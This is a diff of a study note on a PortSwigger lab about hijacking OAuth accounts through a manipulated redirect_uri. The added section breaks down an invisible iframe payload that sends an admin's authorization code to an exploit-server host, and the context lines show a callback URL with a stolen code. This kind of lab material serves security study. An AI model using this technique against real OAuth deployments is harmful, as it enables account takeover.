@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/port-swigger/bscp-path/o-auth-account-hijacking-via-redirect-uri/","tags":["oauth","hijack","redirecturi","burpsuite","offensivesecurity","ethicalhacking","bscp"],"created":"2026-03-28T20:07:06.046+01:00","updated":"2026-04-07T10:21:47.971+02:00","dg-note-properties":{"tags":["oauth","hijack","redirecturi","burpsuite","offensivesecurity","ethicalhacking","bscp"]}}
+{"dg-publish":true,"permalink":"/port-swigger/bscp-path/o-auth-account-hijacking-via-redirect-uri/","tags":["oauth","hijack","redirecturi","burpsuite","offensivesecurity","ethicalhacking","bscp"],"created":"2026-03-28T20:07:06.046+01:00","updated":"2026-04-07T10:26:43.271+02:00","dg-note-properties":{"tags":["oauth","hijack","redirecturi","burpsuite","offensivesecurity","ethicalhacking","bscp"]}}
 ---
 
 
@@ -69,7 +69,7 @@ This endpoint merely displays a simple message when visiting the page. This is w
 
 On the exploit server page there is a **body** field where the "hello world" must be replaced by the payload. What goes in this field dictates what is displayed on the `payload url`.  
 
-### Payload Crafting
+## Payload Crafting
 
 **Payload URL**
 ```
@@ -87,6 +87,33 @@ https://0a8900f7045cb242808c7bc000de007b.web-security-academy.net/oauth-callback
 # Payload with Code
 https://0a8900f7045cb242808c7bc000de007b.web-security-academy.net/oauth-callback?code=___qbo60mqTPzaKYFOirXI04dii0VoIi6kx8dq4UQ5k
 ```
+
+--------
+
+## Payload - Breakdown
+
+**`<iframe src="...">`**
+
+An invisible embedded frame that loads a URL silently in the background. When admin visits the exploit page their browser automatically loads whatever is in the src attribute without them seeing it.
+
+**`oauth-0a39006d043ab24180cc79af02b700be.oauth-server.net/auth`**
+
+The OAuth server's authorization endpoint — this is where OAuth login requests go. 
+
+**`client_id=olybqhd8ypxndl16nvbwv`**
+
+Identifies which application is requesting authorization
+
+**`redirect_uri=https://exploit-0af70010045db28080937aeb010e00af.exploit-server.net`**
+
+This is the attack — normally this would be: 
+redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback
+
+
+
+---------
+
+## Exploit Process
 
 ![](/img/user/Attachments/access-log-before-payload.png)
 
